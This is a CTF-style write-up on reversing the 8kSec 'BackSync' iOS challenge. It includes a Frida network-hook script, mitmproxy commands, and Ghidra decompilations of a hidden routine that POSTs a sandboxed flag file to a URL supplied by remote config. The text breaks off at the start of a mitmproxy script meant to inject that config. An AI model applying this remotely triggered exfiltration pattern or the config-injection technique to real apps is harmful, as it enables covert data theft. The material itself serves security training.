---
title: 8kSec - BackSync
description: "BackSync appears to be a straightforward profile viewer with minimal functionality. However, beneath its unassuming interface lies a background process that periodically fetches remote configurations. These configurations can influence the app’s behavior in unexpected ways."
tags:
  - obj-c
  - network
  - mitm-proxy
  - dylib
  - frida
  - rev-binaries
  - 8ksec
  - ios
keywords:
  - ios hacking
  - ctf writeup
  - 8ksec
  - mobile writeups
  - ios reversing
  - ios exploitation
  - mobile security research
canonical: https://lautarovculic.github.io/writeups/8kSec%20-%20BackSync/
---

**Description**: BackSync appears to be a straightforward profile viewer with minimal functionality. However, beneath its unassuming interface lies a background process that periodically fetches remote configurations. These configurations can influence the app’s behavior in unexpected ways.

**Link**: https://academy.8ksec.io/course/ios-application-exploitation-challenges

![[8ksec-backSync1.png]]

Install an **IPA** file can be difficult. So, for make it more easy, I made a YouTube video with the process using **Sideloadly**. **LINK**: [https://www.youtube.com/watch?v=YPpo9owRKGE](https://www.youtube.com/watch?v=YPpo9owRKGE)

Once you have the app installed, let's proceed with the challenge. **unzip** the **`.ipa`** file.

### Recon
Inside of `Payload/BackSync.app` we can see the `BackSync.debug.dylib` file library.

This is suspicious so, we can **import into Ghidra tool for code analysis**.

Check the **Exports** container in `Symbol Tree`, we can see some functions:

- `checkLocalConfigForVersion`

- `fetchRemoteConfig`

- `fetchRemoteConfigPeriodically`

- `sendFlag`

- `writeFlagToSandbox`


We can notice that the app **make a call** to `http://deletedoldstagingsite.com/remoteConfig`

Check that using this *recon frida script*:
```javascript
if (!ObjC.available) throw new Error("ObjC not available");

function nsstr(p) { return new ObjC.Object(p).toString(); }

function dumpHeaders(hPtr) {
  if (!hPtr || ptr(hPtr).isNull()) return "{}";
  const d = new ObjC.Object(hPtr);
  const keys = d.allKeys();
  const out = [];
  for (let i = 0; i < keys.count(); i++) {
    const k = keys.objectAtIndex_(i).toString();
    const v = d.objectForKey_(keys.objectAtIndex_(i)).toString();
    out.push(`${k}: ${v}`);
  }
  return "{ " + out.join(" | ") + " }";
}

const NSURLSession = ObjC.classes.NSURLSession;
const NSURLSessionTask = ObjC.classes.NSURLSessionTask;

// dataTaskWithURL: (+ completionHandler:)
["- dataTaskWithURL:", "- dataTaskWithURL:completionHandler:"].forEach(sel => {
  if (NSURLSession[sel]) {
    Interceptor.attach(NSURLSession[sel].implementation, {
      onEnter(args) {
        try {
          const url = new ObjC.Object(args[2]).absoluteString().toString();
          console.log(`[NSURLSession ${sel}] URL=${url}`);
        } catch (_) {}
      }
    });
  }
});

// dataTaskWithRequest: (+ completionHandler:) — con null-safety real
["- dataTaskWithRequest:", "- dataTaskWithRequest:completionHandler:"].forEach(sel => {
  if (NSURLSession[sel]) {
    Interceptor.attach(NSURLSession[sel].implementation, {
      onEnter(args) {
        try {
          const reqPtr = args[2];
          if (ptr(reqPtr).isNull()) return;
          const R = new ObjC.Object(reqPtr);

          const url = R.URL() ? R.URL().absoluteString().toString() : "<nil>";
          const method = R.HTTPMethod() ? R.HTTPMethod().toString() : "GET?";

          const hdrsPtr = R.allHTTPHeaderFields();
          const headers = dumpHeaders(hdrsPtr);

          let bodyLen = 0;
          const bodyPtr = R.HTTPBody();
          if (bodyPtr && !ptr(bodyPtr).isNull()) {
            const body = new ObjC.Object(bodyPtr);
            if (body.respondsToSelector_("length")) bodyLen = body.length();
          }

          console.log(`[NSURLSession ${sel}] ${method} ${url}\n  Headers=${headers}\n  BodyLen=${bodyLen}`);
        } catch (e) {
          console.log(`[HookError ${sel}] ${e}`);
        }
      }
    });
  }
});

// resume
if (NSURLSessionTask["- resume"]) {
  Interceptor.attach(NSURLSessionTask["- resume"].implementation, {
    onEnter(args) {
      try {
        const task = new ObjC.Object(args[0]);
        const reqPtr = task.currentRequest();
        if (!reqPtr || ptr(reqPtr).isNull()) return;

        const R = new ObjC.Object(reqPtr);
        const url = R.URL() ? R.URL().absoluteString().toString() : "<nil>";
        const method = R.HTTPMethod() ? R.HTTPMethod().toString() : "GET?";
        const headers = dumpHeaders(R.allHTTPHeaderFields());

        let bodyLen = 0;
        const bodyPtr = R.HTTPBody();
        if (bodyPtr && !ptr(bodyPtr).isNull()) {
          const body = new ObjC.Object(bodyPtr);
          if (body.respondsToSelector_("length")) bodyLen = body.length();
        }

        console.log(`[NSURLSessionTask resume] ${method} ${url}\n  Headers=${headers}\n  BodyLen=${bodyLen}`);
      } catch (e) {
        console.log(`[HookError resume] ${e}`);
      }
    }
  });
}
```

Then, run the application and this command:
```bash
frida -U -n BackSync -l NSURLSession-hook.js
```
Output:
```bash
[iPhone::BackSync ]-> [NSURLSession - dataTaskWithURL:completionHandler:] URL=http://dccdeletedoldstagingsite.com/remoteConfig
[NSURLSessionTask resume] GET http://dccdeletedoldstagingsite.com/remoteConfig
  Headers={}
  BodyLen=0
```

Anyway you can check in **`fetchRemoteConfig`** code:
```C
void BackSync::fetchRemoteConfig(void)

{
 [...]
 VARIABLES
 [...]
  
 [...]
 Foundation.URL?
 [...]
  
  PTR_$$protocol_witness_table_for_Swift.String_:_Swift.CustomStringConvertible_in_Swift_000144d0;
  local_120 = 
  PTR_$$protocol_witness_table_for_Swift.String_:_Swift.TextOutputStreamable_in_Swift_000144c8;
  Swift::DefaultStringInterpolation::$appendInterpolation
            ((char)local_188,
             (DefaultStringInterpolation)PTR_$$type_metadata_for_Swift.String_000144a8);
  $$outlined_destroy_of_Swift.String(local_188);
  DVar6.unknown = (undefined *)(uint)(local_cc & 1);
  SVar7 = Swift::String::init("deletedoldstagingsite.com/remoteConfig",(__int16)local_180,
                              (__int8)(local_cc & 1));
  local_178 = SVar7.bridgeObject;
  Swift::DefaultStringInterpolation::appendLiteral(SVar7,DVar6);
  _swift_bridgeObjectRelease(local_178);
  local_160.unknown = local_38;
  local_168 = local_30;
  _swift_bridgeObjectRetain();
  $$outlined_destroy_of_Swift.DefaultStringInterpolation(local_170);
  local_140 = Swift::String::init(local_160);
  local_150 = 7;
  iVar2 = local_158;
  local_70 = local_140;
  local_80 = (undefined *)Swift::DefaultStringInterpolation::init(7,local_158);
  local_100 = &local_80;
  DVar6.unknown = (undefined *)(uint)(local_cc & 1);
  local_78 = iVar2;
  SVar7 = Swift::String::init("http://",(__int16)local_150,(__int8)(local_cc & 1));
  local_148 = SVar7.bridgeObject;
  Swift::DefaultStringInterpolation::appendLiteral(SVar7,DVar6);
  _swift_bridgeObjectRelease(local_148);
  local_90 = local_140.str;
  local_88 = local_140.bridgeObject;
  Swift::DefaultStringInterpolation::$appendInterpolation
            ((char)&stack0xfffffffffffffff0 + -0x80,local_130);
  DVar6.unknown = (undefined *)(uint)(local_cc & 1);
  SVar7 = Swift::String::init(local_118,(__int16)local_110,(__int8)(local_cc & 1));
  local_108 = SVar7.bridgeObject;
  Swift::DefaultStringInterpolation::appendLiteral(SVar7,DVar6);
  _swift_bridgeObjectRelease(local_108);
  local_f0.unknown = local_80;
  local_f8 = local_78;
  _swift_bridgeObjectRetain();
  $$outlined_destroy_of_Swift.DefaultStringInterpolation(local_100);
  SVar7 = Swift::String::init(local_f0);
  local_e8 = SVar7.bridgeObject;
  Foundation::URL::$init();
  _swift_bridgeObjectRelease(local_e8);
  iVar2 = local_d8;
  (**(code **)(local_e0 + 0x30))(local_d8,local_cc,local_c8);
  UVar4.unknown = local_1c8;
  if ((sdword)iVar2 == 1) {
    $$outlined_destroy_of_Foundation.URL?(0,local_d8);
    _swift_bridgeObjectRelease(local_140.bridgeObject);
  }
  else {
    (**(code **)(local_e0 + 0x20))(local_1b8,local_d8,local_c8);
    puVar3 = &_OBJC_CLASS_$_NSURLSession;
    _objc_opt_self();
    _objc_msgSend();
    _objc_retainAutoreleasedReturnValue();
    local_1f0 = puVar3;
    (**(code **)(local_e0 + 0x10))(UVar4.unknown,local_1b8,local_c8);
    local_1f8 = Foundation::URL::_bridgeToObjectiveC(UVar4);
    local_1e0 = *(code **)(local_e0 + 8);
    (*local_1e0)(local_1c8,local_c8);
    local_a0 = 
    $$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_BackSync.fetc hRemoteConfig()_->_()
    ;
    local_98 = 0;
    local_c0 = PTR___NSConcreteStackBlock_000140f0;
    local_b8 = 0x42000000;
    local_b4 = 0;
    local_b0 = 
    $$reabstraction_thunk_helper_from_@escaping_@callee_guaranteed_@Sendable_(@guaranteed_Foundation .Data?,@guaranteed___C.NSURLResponse?,@guaranteed_Swift.Error?)_->_()_to_@escaping_@callee_unown ed_@convention(block)_@Sendable_(@unowned___C.NSData?,@unowned___C.NSURLResponse?,@unowned___C.N SError?)_->_()
    ;
    local_a8 = &_block_descriptor.3;
    local_200 = __Block_copy(&local_c0);
    puVar3 = local_1f0;
    _objc_msgSend(local_1f0,"dataTaskWithURL:completionHandler:",local_1f8);
    _objc_retainAutoreleasedReturnValue();
    local_1e8 = puVar3;
    __Block_release(local_200);
    (*(code *)PTR__objc_release_000140c8)(local_1f8);
    (*(code *)PTR__objc_release_000140c8)(local_1f0);
    _objc_msgSend(local_1e8,"resume");
    (*(code *)PTR__objc_release_000140c8)(local_1e8);
    (*local_1e0)(local_1b8,local_c8);
    _swift_bridgeObjectRelease(local_140.bridgeObject);
  }
  return;
}
```

Notice that `http://deletedoldstagingsite.com` doesn't response. So, let's **intercept** this call using **MITMProxy**.

I will skip the setup of proxy, you must know how to set up a lab in iOS and macOS. And there are a lot of content in internet.

Let's start the *mitmproxy*
```bash
mitmproxy --listen-host 0.0.0.0 --listen-port 8080
```

![[8ksec-backSync2.png]]

We can confirm that no information is transmitted in these request.

And we don't need **interact with the app**, in fact, probably the buttons doesn't nothing.

If we pay attention, in **`fetchRemoteConfigPeriodically`**, the **request is sent every 10 seconds**:
```C
  else {
    DVar8.unknown = (undefined *)*local_c0;
    local_1c8 = (int *)DVar8.unknown;
    _swift_unknownObjectRetain(DVar8.unknown);
    _swift_endAccess(aiStack_58);
    _swift_getObjectType();
    local_1d0.unknown = DVar8.unknown;
    Dispatch::DispatchTime::now(DVar8);
    (extension_Dispatch)::__C::OS_dispatch_source_timer::$schedule(local_1d0,in_d0,DVar2);
    (extension_Dispatch)::__C::OS_dispatch_source_timer::schedule
              (local_168,10.0,(DispatchTimeInterval)(__int8)local_188);
    (**(code **)(local_198 + 8))(local_188,local_1a0);
    (**(code **)(local_178 + 8))(local_168.unknown,local_180);
    piVar9 = local_1c8;
    _swift_unknownObjectRelease();
  }
```
Specific -> `(local_168,10.0,(DispatchTimeInterval)(__int8)local_188);`

What is `dataTaskWithURL:completionHandler:`?

- https://developer.apple.com/documentation/foundation/urlsession/datatask(with:completionhandler:)-52wk8

The method `dataTaskWithURL:completionHandler:` is a fundamental part of `NSURLSession` in

Apple's Foundation framework, **used for making network requests and handling the response**.

But, let's see the order that the app execute. First, we have also `init` functions.

So, `init` function is important because execute another functions:

- `writeFlagToSandbox()` → guarantees `flag.txt`

- `fetchRemoteConfigPeriodically()` → schedules the **fetch loop every ~10 s**.

**Implication**: The flag is *always set before the first GET to `remoteConfig`*

The **`writeFlagToSandbox()`** function:
```C
  local_38 = (undefined *)0x0;
  local_48 = (String)ZEXT816(0);
  local_c8 = 0;
  local_f8 = (undefined *)Encoding::$typeMetadataAccessor();
  local_f0 = *(int *)(local_f8 + -8);
  local_e8 = *(int *)(local_f0 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_000140f8)(local_c8);
  iVar1 = -local_e8;
  local_70.unknown = local_100 + iVar1;
  local_a0 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_b0 = *(int *)(local_a0 + -8);
  local_e0 = *(int *)(local_b0 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  iVar1 = (int)(local_100 + iVar1) - local_e0;
  local_d8 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_a8 = iVar1;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  local_68.unknown = (undefined *)(iVar1 - local_d8);
  local_74 = 1;
  local_38 = local_68.unknown;
  local_88 = Swift::String::init("FLAG{you_remotely_triggered_the_leak}",0x25,1);
  puVar3 = &_OBJC_CLASS_$_NSFileManager;
  local_48 = local_88;
  _objc_opt_self();
  _objc_msgSend();
  _objc_retainAutoreleasedReturnValue();
  local_d0 = puVar3;
  _objc_msgSend();
  _objc_retainAutoreleasedReturnValue();
  local_90 = puVar3;
  (*(code *)PTR__objc_release_000140c8)(local_d0);
  AVar2 = (extension_Foundation)::Swift::Array<undefined>::$_unconditionallyBridgeFromObjectiveC();
  local_c0 = CONCAT44(extraout_var,AVar2);
  Swift::Array<undefined>::get_subscript(local_c8,AVar2);
  _swift_bridgeObjectRelease(local_c0);
  UVar4.unknown = (undefined *)(uint)(local_74 & 1);
  SVar5 = Swift::String::init("flag.txt",8,(__int8)(local_74 & 1));
  local_b8 = SVar5.bridgeObject;
  Foundation::URL::appendingPathComponent(SVar5,UVar4);
  _swift_bridgeObjectRelease(local_b8);
  local_98 = *(code **)(local_b0 + 8);
  (*local_98)(local_a8,local_a0);
  (*(code *)PTR__objc_release_000140c8)(local_90);
  local_58 = local_88.str;
  local_50 = local_88.bridgeObject;
  Encoding::$get_utf8((Encoding)local_88.str);
  Swift::String::$lazy_protocol_witness_table_accessor();
  (extension_Foundation)::Swift::StringProtocol::$write
            (local_68,(bool)((byte)local_74 & 1),local_70);
  local_60 = 0;
  (**(code **)(local_f0 + 8))(local_70.unknown,local_f8);
  (*local_98)(local_68.unknown,local_a0);
  _swift_bridgeObjectRelease(local_88.bridgeObject);
  return;
```
Will create the `flag.txt` file into `Documents` **sandbox directory**.

### The sendFlag function
And the **most important function**: **`BackSync.sendFlag(to: String)`**
```C
  local_130 = to.bridgeObject;
  local_128 = to.str;
  local_38 = *(int *)PTR____stack_chk_guard_00014108;
  local_48 = (URLRequest *)0x0;
  local_50 = 0;
  local_58 = 0;
  local_68 = (char *)0x0;
  local_60 = (void *)0x0;
  local_78 = (char *)0x0;
  local_70 = (void *)0x0;
  local_80 = (undefined *)0x0;
  local_f8 = 0;
  local_170 = (undefined *)Foundation::URLRequest::typeMetadataAccessor();
  local_168 = *(int *)(local_170 + -8);
  local_160 = *(int *)(local_168 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  puVar3 = (undefined *)((int)&local_2a0 - local_160);
  local_150 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_158 = puVar3;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  pUVar1 = (URLRequest *)(puVar3 + -local_150);
  puVar3 = &$$demangling_cache_variable_for_type_metadata_for_Foundation.URL?;
  local_148 = pUVar1;
  local_48 = pUVar1;
  ___swift_instantiateConcreteTypeFromMangledName();
  local_140 = *(int *)(*(int *)(puVar3 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_000140f8)(local_f8);
  iVar4 = (int)pUVar1 - local_140;
  local_138 = iVar4;
  local_c8 = (undefined *)Foundation::URL::typeMetadataAccessor();
  local_d8 = *(int *)(local_c8 + -8);
  local_120 = *(int *)(local_d8 + 0x40) + 0xfU & 0xfffffffffffffff0;
  pcVar9 = local_128;
  pvVar8 = local_130;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  iVar4 = iVar4 - local_120;
  local_110 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  local_118 = iVar4;
  local_50 = iVar4;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  puVar3 = (undefined *)(iVar4 - local_110);
  local_108 = extraout_x8_01 + 0xfU & 0xfffffffffffffff0;
  local_d0.unknown = puVar3;
  (*(code *)PTR____chkstk_darwin_000140f8)();
  local_b0 = (int)puVar3 - local_108;
  puVar3 = &_OBJC_CLASS_$_NSFileManager;
  local_68 = pcVar9;
  local_60 = pvVar8;
  local_58 = local_b0;
  _objc_opt_self();
  _objc_msgSend();
  _objc_retainAutoreleasedReturnValue();
  local_100 = puVar3;
  _objc_msgSend();
  _objc_retainAutoreleasedReturnValue();
  local_b8 = puVar3;
  (*(code *)PTR__objc_release_000140c8)(local_100);
  AVar2 = (extension_Foundation)::Swift::Array<undefined>::$_unconditionallyBridgeFromObjectiveC();
  local_f0 = CONCAT44(extraout_var,AVar2);
  Swift::Array<undefined>::get_subscript(local_f8,AVar2);
  _swift_bridgeObjectRelease(local_f0);
  UVar5.unknown = (undefined *)((int)&mach_header_00000000.magic + 1);
  SVar10 = Swift::String::init("flag.txt",8,1);
  local_e0 = SVar10.bridgeObject;
  Foundation::URL::appendingPathComponent(SVar10,UVar5);
  _swift_bridgeObjectRelease(local_e0);
  local_c0 = *(code **)(local_d8 + 8);
  (*local_c0)(local_d0.unknown,local_c8);
  (*(code *)PTR__objc_release_000140c8)(local_b8);
  local_a8 = (extension_Foundation)::Swift::String::$init();
  local_98 = 0;
  local_180 = local_a8.str;
  local_178 = local_a8.bridgeObject;
  local_190 = local_a8.bridgeObject;
  local_188 = local_a8.str;
  if (local_a8.bridgeObject != (void *)0x0) {
    local_1a0 = local_a8.str;
    local_198 = local_a8.bridgeObject;
    local_1b0 = local_a8.bridgeObject;
    local_1a8 = local_a8.str;
    local_78 = local_a8.str;
    local_70 = local_a8.bridgeObject;
    Foundation::URL::$init();
    iVar4 = local_138;
    (**(code **)(local_d8 + 0x30))(local_138,1,local_c8);
    pUVar1 = local_148;
    if ((sdword)iVar4 != 1) {
      (**(code **)(local_d8 + 0x20))(local_118,local_138,local_c8);
      UVar5.unknown = local_d0.unknown;
      (**(code **)(local_d8 + 0x10))(local_d0.unknown,local_118,local_c8);
      $$default_argument_1_of_Foundation.URLRequest.init(url:_Foundation.URL,cachePolicy:___C.NSURLR equestCachePolicy,timeoutInterval:_Swift.Double)_->_Foundation.URLRequest
                ();
      local_240.unknown = UVar5.unknown;
      $$default_argument_2_of_Foundation.URLRequest.init(url:_Foundation.URL,cachePolicy:___C.NSURLR equestCachePolicy,timeoutInterval:_Swift.Double)_->_Foundation.URLRequest
                ();
      Foundation::URLRequest::init(local_d0,local_240,in_d0);
      local_218 = 4;
      local_21c = 1;
      Swift::String::init("POST",4,1);
      Foundation::URLRequest::$set_httpMethod(pUVar1);
      SVar10 = Swift::String::init("application/json",0x10,(byte)local_21c & 1);
      local_228 = SVar10.bridgeObject;
      local_238 = SVar10.str;
      SVar10 = Swift::String::init("Content-Type",0xc,(byte)local_21c & 1);
      local_230 = SVar10.bridgeObject;
      SVar11.bridgeObject = local_228;
      SVar11.str = local_238;
      Foundation::URLRequest::$setValue(SVar11,(URLRequest.conflict)SVar10.str);
      _swift_bridgeObjectRelease(local_230);
      _swift_bridgeObjectRelease(local_228);
      puVar3 = &$$demangling_cache_variable_for_type_metadata_for_(Swift.String,Swift.String);
      ___swift_instantiateConcreteTypeFromMangledName();
      local_200 = puVar3;
      local_210 = Swift::$_allocateUninitializedArray(1);
      SVar10 = Swift::String::init("flag",(__int16)local_218,(byte)local_21c & 1);
      *(String *)local_210.1 = SVar10;
      _swift_bridgeObjectRetain(local_1b0);
      *(char **)((int)local_210.1 + 0x10) = local_1a8;
      *(void **)((int)local_210.1 + 0x18) = local_1b0;
      Swift::$_finalizeUninitializedArray(local_210.0);
      local_1f8 = PTR_$$type_metadata_for_Swift.String_000144a8;
      local_1f0 = PTR_$$protocol_witness_table_for_Swift.String_:_Swift.Hashable_in_Swift_000144b0;
      local_1e8 = (undefined *)Swift::Dictionary::$init();
      local_1e0 = 0;
      local_40 = 0;
      puVar3 = &_OBJC_CLASS_$_NSJSONSerialization;
      local_80 = local_1e8;
      _objc_opt_self();
      local_1d0 = puVar3;
      _swift_bridgeObjectRetain(local_1e8);
      local_1c0 = (extension_Foundation)::Swift::Dictionary::_bridgeToObjectiveC();
      _swift_bridgeObjectRelease(local_1e8);
      __C::NSJSONWritingOptions::typeMetadataAccessor();
      tVar12 = Swift::$_allocateUninitializedArray((__int16)local_1e0);
      local_1d8 = tVar12._0_8_;
      __C::NSJSONWritingOptions::$lazy_protocol_witness_table_accessor();
      (extension_Swift)::Swift::SetAlgebra::$init();
      local_90 = local_40;
      pcVar9 = "dataWithJSONObject:options:error:";
      puVar3 = local_1d0;
      _objc_msgSend(local_1d0,"dataWithJSONObject:options:error:",local_1c0,local_88,&local_90);
      _objc_retainAutoreleasedReturnValue();
      local_1c8 = local_90;
      local_1b8.unknown = puVar3;
      (*(code *)PTR__objc_retain_000140d0)();
      uVar7 = local_40;
      local_40 = local_1c8;
      (*(code *)PTR__objc_release_000140c8)(uVar7);
      _swift_unknownObjectRelease(local_1c0);
      if (local_1b8.unknown == (undefined *)0x0) {
        local_2a0 = local_40;
        uVar7 = local_40;
        Foundation::$_convertNSErrorToError();
        local_298 = uVar7;
        (*(code *)PTR__objc_release_000140c8)(local_2a0);
        _swift_willThrow();
        _swift_errorRelease(local_298);
        local_258 = (undefined *)0x0;
        local_250 = (char *)0xf000000000000000;
      }
      else {
        local_248 = local_1b8.unknown;
        local_270 = local_1b8.unknown;
        local_268 = (undefined *)Foundation::Data::$_unconditionallyBridgeFromObjectiveC(local_1b8);
        local_260 = pcVar9;
        (*(code *)PTR__objc_release_000140c8)(local_270);
        local_258 = local_268;
        local_250 = local_260;
      }
      Foundation::URLRequest::$set_httpBody(local_148);
      UVar6.unknown = local_158;
      puVar3 = &_OBJC_CLASS_$_NSURLSession;
      _objc_opt_self();
      _objc_msgSend();
      _objc_retainAutoreleasedReturnValue();
      local_288 = puVar3;
      (**(code **)(local_168 + 0x10))(UVar6.unknown,local_148,local_170);
      local_290 = Foundation::URLRequest::_bridgeToObjectiveC(UVar6);
      local_278 = *(code **)(local_168 + 8);
      (*local_278)(local_158,local_170);
      puVar3 = local_288;
      _objc_msgSend(local_288,"dataTaskWithRequest:",local_290);
      _objc_retainAutoreleasedReturnValue();
      local_280 = puVar3;
      (*(code *)PTR__objc_release_000140c8)(local_290);
      (*(code *)PTR__objc_release_000140c8)(local_288);
      _objc_msgSend(local_280,"resume");
      (*(code *)PTR__objc_release_000140c8)(local_280);
      _swift_bridgeObjectRelease(local_1e8);
      (*local_278)(local_148,local_170);
      (*local_c0)(local_118,local_c8);
      _swift_bridgeObjectRelease(local_1b0);
      (*local_c0)(local_b0,local_c8);
      goto LAB_0000bbcc;
    }
    $$outlined_destroy_of_Foundation.URL?(local_138);
    _swift_bridgeObjectRelease(local_1b0);
  }
  (*local_c0)(local_b0,local_c8);
LAB_0000bbcc:
  if (*(int *)PTR____stack_chk_guard_00014108 - local_38 != 0) {
                    /* WARNING: Subroutine does not return */
    ___stack_chk_fail(*(int *)PTR____stack_chk_guard_00014108 - local_38);
  }
  return;
```

This is the **vulnerable function**

1. Gets **Documents** and builds `.../Documents/flag.txt`.

2. **Reads the contents** of `flag.txt` into a String (UTF-8).

3. Constructs a `URLRequest` to (...).

4. **POST** with `Content-Type: application/json` and body `{"flag": "<content>"}` via `NSJSONSerialization`.

5. Creates `dataTaskWithRequest` and r`esume()` → **exfiltrates the flag**.

### Closure
So, **how trigger this function**?

Let's search in the program for the text **`NSJSONSerialization`**!

We can found this **closure**:

- `$$closure_#1_@Sendable_(Foundation.Data?,__C.NSURLResponse?,Swift.Error?)_->_()_in_BackSync.fet chRemoteConfig()_->_()`
```C
  local_38 = *(int *)PTR____stack_chk_guard_00014108;
  local_58 = (undefined *)0x0;
  local_50 = 0;
  local_f8 = (undefined *)0x0;
  local_128 = (char *)0x0;
  local_120 = (void *)0x0;
  local_e0 = param_4;
  local_d8 = param_3;
  local_48 = param_1.unknown;
  local_40 = param_2;
  $outlined_copy();
  if ((param_2 & 0xf000000000000000) == 0xf000000000000000) goto LAB_00005898;
  local_60 = 0;
  puVar5 = &_OBJC_CLASS_$_NSJSONSerialization;
  local_58 = param_1.unknown;
  local_50 = param_2;
  _objc_opt_self();
  _Var3.value = (__int8)param_1.unknown;
  outlined_copy(_Var3);
  pNVar6 = Foundation::Data::_bridgeToObjectiveC(param_1);
  outlined_consume(_Var3);
  __C::NSJSONReadingOptions::typeMetadataAccessor();
  Swift::$_allocateUninitializedArray(0);
  __C::NSJSONReadingOptions::$lazy_protocol_witness_table_accessor();
  (extension_Swift)::Swift::SetAlgebra::$init();
  local_f0 = local_60;
  _objc_msgSend(puVar5,"JSONObjectWithData:options:error:",pNVar6,local_e8,&local_f0);
  _objc_retainAutoreleasedReturnValue();
  uVar1 = local_f0;
  (*(code *)PTR__objc_retain_000140d0)();
  uVar9 = local_60;
  local_60 = uVar1;
  (*(code *)PTR__objc_release_000140c8)(uVar9);
  (*(code *)PTR__objc_release_000140c8)(pNVar6);
  uVar1 = local_60;
  if (puVar5 == (undefined *)0x0) {
    uVar9 = local_60;
    Foundation::$_convertNSErrorToError();
    (*(code *)PTR__objc_release_000140c8)(uVar1);
    _swift_willThrow();
    _swift_errorRelease(uVar9);
    local_1b8.unknown = (undefined *)0x0;
  }
  else {
    Swift::$_bridgeAnyObjectToAny();
    puVar7 = &$$demangling_cache_variable_for_type_metadata_for_[Swift.String_:_Swift.String];
    ___swift_instantiateConcreteTypeFromMangledName
              (&$$demangling_cache_variable_for_type_metadata_for_[Swift.String_:_Swift.String]);
    ppuVar8 = &local_130;
    _swift_dynamicCast(ppuVar8,auStack_d0,PTR_$$type_metadata_for_Any_00014630 + 8,puVar7,6);
    if (((uint)ppuVar8 & 1) == 0) {
      local_1b0 = (undefined *)0x0;
    }
    else {
      local_1b0 = local_130;
    }
    _swift_unknownObjectRelease(puVar5);
    local_1b8.unknown = local_1b0;
  }
  if (local_1b8.unknown == (undefined *)0x0) {
    outlined_consume(_Var3);
    goto LAB_00005898;
  }
  local_f8 = local_1b8.unknown;
  local_108 = Swift::String::init("mode",4,1);
  pcVar11 = PTR_$$protocol_witness_table_for_Swift.String_:_Swift.Hashable_in_Swift_000144b0;
  Swift::Dictionary::$get_subscript((char)&local_108,local_1b8);
  $$outlined_destroy_of_Swift.String(&local_108);
  _swift_bridgeObjectRetain();
  SVar12 = Swift::String::init("collect_logs",0xc,1);
  pvVar10 = SVar12.bridgeObject;
  _swift_bridgeObjectRetain();
  local_90 = local_70;
  local_88 = local_68;
  local_80 = SVar12;
  if (local_68 == 0) {
    if (pvVar10 != (void *)0x0) goto LAB_00005778;
    $$outlined_destroy_of_Swift.String?(&local_90);
    bVar4 = true;
  }
  else {
    $$outlined_init_with_copy_of_Swift.String?(&local_90,&local_b0);
    if (local_80.bridgeObject == (void *)0x0) {
      $$outlined_destroy_of_Swift.String(&local_b0);
      SVar12 = local_80;
LAB_00005778:
      local_80 = SVar12;
      $$outlined_destroy_of_(Swift.String?,Swift.String?)(&local_90);
      bVar4 = false;
    }
    else {
      _swift_bridgeObjectRetain();
      SVar12 = local_80;
      pvVar2 = local_80.bridgeObject;
      _swift_bridgeObjectRetain();
      SVar13.bridgeObject = local_a8;
      SVar13.str = local_b0;
      SVar14.bridgeObject = param_6;
      SVar14.str = pcVar11;
      bVar4 = Swift::String::==_infix(SVar13,SVar12,SVar14);
      _swift_bridgeObjectRelease(pvVar2);
      _swift_bridgeObjectRelease(local_a8);
      _swift_bridgeObjectRelease(pvVar2);
      _swift_bridgeObjectRelease(local_a8);
      $$outlined_destroy_of_Swift.String?(&local_90);
    }
  }
  _swift_bridgeObjectRelease(pvVar10);
  _swift_bridgeObjectRelease(local_68);
  if (bVar4 == false) {
    _swift_bridgeObjectRelease(local_1b8.unknown);
    outlined_consume(_Var3);
  }
  else {
    local_118 = Swift::String::init("target_url",10,1);
    Swift::Dictionary::$get_subscript((char)&local_118,local_1b8);
    $$outlined_destroy_of_Swift.String(&local_118);
    if (local_98 == (void *)0x0) {
      _swift_bridgeObjectRelease(local_1b8.unknown);
      outlined_consume(_Var3);
    }
    else {
      SVar12.bridgeObject = local_98;
      SVar12.str = local_a0;
      local_128 = local_a0;
      local_120 = local_98;
      BackSync::sendFlag(SVar12);
      _swift_bridgeObjectRelease(local_98);
      _swift_bridgeObjectRelease(local_1b8.unknown);
      outlined_consume(_Var3);
    }
  }
LAB_00005898:
  if (*(int *)PTR____stack_chk_guard_00014108 - local_38 == 0) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  ___stack_chk_fail(*(int *)PTR____stack_chk_guard_00014108 - local_38);
```

But **what is a closure**?

A closure in **Swift** is an **anonymous function created in place** (e.g., the `URLSession` completion handler).

At the *binary level* (Mach-O), this closure *is not a public exported function like those in an API*; it is a block (Objective-C block) with:

- A *stack/heap structure* (containing a pointer to the "*invoke*" function, descriptor, captures, etc.).

- A pointer to the **routine that executes the closure body**.

The name of the closure, is "synthetic" (*invented by Ghidra when reconstructing the stream*); it *does not appear in the binary's export table*.

Even *if they're not exported*, Ghidra **lists them as internal functions** (local symbols). That's why *you won't see them in Exports, but you will see them in Functions*.

It's **code that you pass to an API** (e.g., `URLSession`) to **be executed when a result is received (`data/response/error`)**. It captures **environment variables** (e.g., the *destination URL*) and *decides what to do with the content*.

So, let's *understand THIS closure*:

1. **Decode JSON** with `NSJSONSerialization.JSONObjectWithData(...)`.

2. **Bridge** → **Any** → `[String:String] (_swift_dynamicCast` to `String:String`).

3. Read **mode** and **compare** with "`collect_logs`".

4. If **it's not `collect_logs`** → exit.

5. If **it's `collect_logs`**, **take `target_url` and call `BackSync::sendFlag(target_url)`**.

### Solution
Let's create a **mitimproxy** script that will trigger the `sendFlag()` function!
```python
from mitmproxy import http, ctx

SUFFIX = "deletedoldstagingsite.com"  # target host suffix

def request(flow: http.HTTPFlow):
    # act only on cleartext HTTP to matching hosts
    if flow.request.scheme == "http" and flow.request.host.endswith(SUFFIX):

        # intercept GET /remoteConfig: return crafted JSON (no upstream)
